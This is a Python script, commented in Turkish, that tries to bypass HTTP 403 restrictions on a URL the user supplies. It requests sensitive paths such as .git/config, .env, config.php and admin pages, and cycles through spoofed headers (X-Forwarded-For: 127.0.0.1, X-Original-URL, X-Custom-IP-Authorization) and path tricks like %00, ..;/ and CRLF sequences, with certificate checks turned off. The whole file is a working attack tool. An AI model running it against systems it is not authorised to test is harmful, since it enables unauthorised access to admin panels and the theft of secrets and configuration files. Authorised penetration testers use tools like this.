import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import init, Fore, Style

# SSL sertifikası doğrulaması hatasını engellemek için uyarıyı devre dışı bıraktım.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Colorama'yı başlat
init()

def bypass_403(target_url):
    paths = [
        "",  # Ana dizin
        "admin",  # Admin paneli için
        "robots.txt",  # robots.txt dosyası için
        ".git/config",  # Git konfigürasyon dosyası için
        "index.php",  # Ana sayfa için
        "login",  # Giriş sayfası için
        "wp-login.php",  # WordPress giriş sayfası için
        "config.php",  # Konfigürasyon dosyası için
        "api",  # API dizini
        "hidden",  # Gizli dosyalar
        "private",  # Özel dosyalar
        ".env",  # Çevre dosyası
        "backup",  # Yedek dosyalar
        "old",  # Eski dosyalar
        "test",  # Test dizini
        "temp",  # Geçici dosyalar
        # Daha fazla yol ekleyebilirsiniz
    ]

    headers = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"},
        {"Referer": "http://www.google.com"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Original-URL": "/"},
        {"X-Rewrite-URL": "/"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Proto": "https"},
        {"X-Forwarded-Port": "443"},
        {"X-HTTP-Method-Override": "PUT"},
        {"X-Forwarded-Server": "localhost"},
        {"X-Forwarded-Scheme": "http"},
        {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"},
        # Daha fazla başlık ekleyebilirsiniz
    ]

    parameters = [
        {"%00": ""},
        {"%09": ""},
        {"%20": ""},
        {"%2e": ""},
        {"..;/": ""},
        {"?": ""},
        {"#": ""},
        {";": ""},
        {"/": ""},
        {".": ""},
        {"..": ""},
        {"..%00/": ""},
        {"..%0d%0a": ""},
        {"?anything": ""},
        {"?param=": ""},
        {"?redirect=": ""},
        {"?url=": ""},
        {"?next=": ""},
        {"?destination=": ""},
        {"?continue=": ""},
        {"?file=": ""},
        {"?path=": ""},
        {"?folder=": ""},
        # Daha fazla URL manipülasyon parametresi ekleyebilirsiniz
    ]

    for path in paths:
        for header in headers:
            for param in parameters:
                url = f"{target_url}/{path}"
                try:
                    response = requests.get(url, headers=header, params=param, verify=False)
                    if response.status_code == 200:
                        print(Fore.GREEN + f"{url} - {header} - {param} --> {response.status_code}" + Style.RESET_ALL)
                    elif response.status_code == 403:
                        print(Fore.RED + f"{url} - {header} - {param} --> {response.status_code}" + Style.RESET_ALL)
                    else:
                        print(Fore.YELLOW + f"{url} - {header} - {param} --> {response.status_code}" + Style.RESET_ALL)
                except Exception as e:
                    print(Fore.MAGENTA + f"Hata: {e}" + Style.RESET_ALL)

if __name__ == "__main__":
    target_url = input("Hedef URL'yi girin: ")
    bypass_403(target_url)
